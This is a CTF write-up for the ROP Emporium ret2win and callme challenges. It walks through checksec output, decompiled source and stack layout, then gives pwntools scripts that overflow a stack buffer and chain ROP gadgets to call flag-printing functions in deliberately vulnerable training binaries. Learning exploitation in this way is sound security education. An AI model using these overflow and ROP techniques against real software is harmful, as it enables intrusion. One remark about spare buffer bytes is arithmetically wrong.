---
title: 'ROP Emporium: ret2win and callme'
date: 2019-01-01T00:00:00.000Z
excerpt: >-
  Writeups for the ROP Emporium ret2win (basic ROP control-flow hijacking)
  and callme (chained function calls with specific arguments) challenges.
tags:
  - wargame
  - writeup
  - pwn
  - rop-emporium
categories:
  - CTF
authors:
  - name: ph4nt0m
    link: 'https://github.com/Phantomn'
    image: 'https://github.com/Phantomn.png'
---

## ret2win

### Binary Info

```
checksec --file ret2win
[*] '/home/ubuntu/rop_emporium/ret2win/ret2win'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

NX is enabled, so we can't place shellcode on the stack and execute it. There's no PIE, so addresses are fixed. There's also no canary, so there's no stack protection.

### Source Analysis

```c
int ret2win()
{
  puts("Well done! Here's your flag:");
  return system("/bin/cat flag.txt");
}

int pwnme()
{
  char s[32]; // [rsp+0h] [rbp-20h]

  memset(s, 0, 32uLL);
  puts("For my first trick, I will attempt to fit 56 bytes of user input into 32 bytes of stack buffer!");
  puts("What could possibly go wrong?");
  puts("You there, may I have your input please? And don't worry about null bytes, we're using read()!\n");
  printf("> ");
  read(0, s, 56uLL);
  return puts("Thank you!");
}

int __cdecl main(int argc, const char **argv, const char **envp)
{
  setvbuf(_bss_start, 0LL, 2, 0LL);
  puts("ret2win by ROP Emporium");
  puts("x86_64\n");
  pwnme();
  puts("\nExiting");
  return 0;
}
```

`pwnme` reads up to 56 bytes into a 32-byte buffer. The `ret2win` function prints the flag when called. Since there's no canary and no PIE, all we need to do is overwrite the return address with `ret2win`'s fixed address.

Since `read` accepts up to 52 more bytes than needed, placing `ret2win`'s address at `pwnme`'s ret should be enough.

### Stack Layout

```
gef> x/40xg $rsp
0x7fffffffe3f0:  0x4141414141414141  0x4141414141414141
0x7fffffffe400:  0x4141414141414141  0x4141414141414141
0x7fffffffe410:  0x00007fffffffe40a  0x00000000004006d7
0x7fffffffe420:  0x0000000000400780  0x00007ffff7a03bf7
```

```
buf[32] | SFP[8] | ret[8]
```

We need 40 bytes of padding before the return address, followed by the `ret2win` address.

### Exploit

```python
from pwn import *

p = process("./ret2win")

ret2win = 0x400756

payload = ''
payload += "A" * 40
payload += p64(ret2win)

print(p.recvuntil("> "))
p.sendline(payload)
p.interactive()
```

---

## callme

### Source Analysis

```c
void __fastcall __noreturn callme_three(__int64 a1, __int64 a2, __int64 a3)
{
  if ( a1 == 0xDEADBEEFDEADBEEF && a2 == 0xCAFEBABECAFEBABE && a3 == 0xD00DF00DD00DF00D )
  {
    // read key2.dat, XOR the buffer, print the flag
    puts(g_buf);
    exit(0);
  }
  puts("Incorrect parameters");
  exit(1);
}

int __fastcall callme_two(__int64 a1, __int64 a2, __int64 a3)
{
  if ( a1 != 0xDEADBEEFDEADBEEF || a2 != 0xCAFEBABECAFEBABE || a3 != 0xD00DF00DD00DF00D )
  {
    puts("Incorrect parameters");
    exit(1);
  }
  // read key1.dat, XOR the first 16 bytes of g_buf
  return puts("callme_two() called correctly");
}

int __fastcall callme_one(__int64 a1, __int64 a2, __int64 a3)
{
  if ( a1 != 0xDEADBEEFDEADBEEF || a2 != 0xCAFEBABECAFEBABE || a3 != 0xD00DF00DD00DF00D )
  {
    puts("Incorrect parameters");
    exit(1);
  }
  // read encrypted_flag.dat into g_buf
  return puts("callme_one() called correctly");
}

int pwnme()
{
  char s[32]; // [rsp+0h] [rbp-20h]

  memset(s, 0, 32uLL);
  puts("Hope you read the instructions...\n");
  printf("> ");
  read(0, s, 512uLL);
  return puts("Thank you!");
}
```

Three functions must be called **in order** -- `callme_one`, `callme_two`, `callme_three` -- each with the same arguments `(0xDEADBEEFDEADBEEF, 0xCAFEBABECAFEBABE, 0xD00DF00DD00DF00D)`. On x86-64, these arguments are passed in the `rdi`, `rsi`, and `rdx` registers.

### Strategy

`pwnme` reads up to 512 bytes -- plenty of room for a full ROP chain. The plan:

1. Find a `pop rdi; pop rsi; pop rdx; ret` gadget (or an equivalent one)
2. Set up the three argument registers before each call
3. Chain: `gadget -> args -> callme_one -> gadget -> args -> callme_two -> gadget -> args -> callme_three`

```bash
ROPgadget --binary callme | grep "pop rdi"
```

### Exploit

```python
from pwn import *

p = process("./callme")
elf = ELF("./callme")

# ROP gadget: pop rdi; pop rsi; pop rdx; ret
pop_rdi_rsi_rdx = 0x0000000000401ab0

callme_one   = elf.sym['callme_one']
callme_two   = elf.sym['callme_two']
callme_three = elf.sym['callme_three']

arg1 = 0xDEADBEEFDEADBEEF
arg2 = 0xCAFEBABECAFEBABE
arg3 = 0xD00DF00DD00DF00D

def call_with_args(func_addr):
    chain  = p64(pop_rdi_rsi_rdx)
    chain += p64(arg1)
    chain += p64(arg2)
    chain += p64(arg3)
    chain += p64(func_addr)
    return chain

payload  = b"A" * 40
payload += call_with_args(callme_one)
payload += call_with_args(callme_two)
payload += call_with_args(callme_three)

p.recvuntil("> ")
p.sendline(payload)
p.interactive()
```

The key point is that on x86-64, the first three arguments are passed via `rdi`, `rsi`, and `rdx` respectively. Each function call in the chain first sets those registers with a single pop gadget, then calls the target function.
